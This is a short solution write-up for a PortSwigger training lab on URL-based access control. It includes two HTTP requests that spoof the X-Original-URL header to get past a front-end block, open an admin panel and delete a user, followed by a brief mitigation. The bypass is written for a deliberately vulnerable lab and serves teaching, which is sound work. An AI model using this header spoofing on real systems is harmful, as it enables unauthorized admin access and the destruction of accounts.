# Lab 05 — URL-based access control

> **Apprentice** · [Official lab](https://portswigger.net/web-security/access-control/lab-url-based-access-control)

**Entry point:** the front-end denies `/admin` based on the URL — but the
back-end routes via `X-Original-URL`.

## Solution

1. `GET /admin` → 403 from the front-end.
2. Route around it: request an allowed path while telling the back-end the
   real one:

```http
GET / HTTP/1.1
X-Original-URL: /admin
```

3. The admin panel renders. For the deletion, the back-end reads the query
   string of the *original* URL:

```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

Lab solved.

## Mitigation

Make access-control decisions in the component that knows the final route
(the back-end), not on raw URLs at a front-end layer.
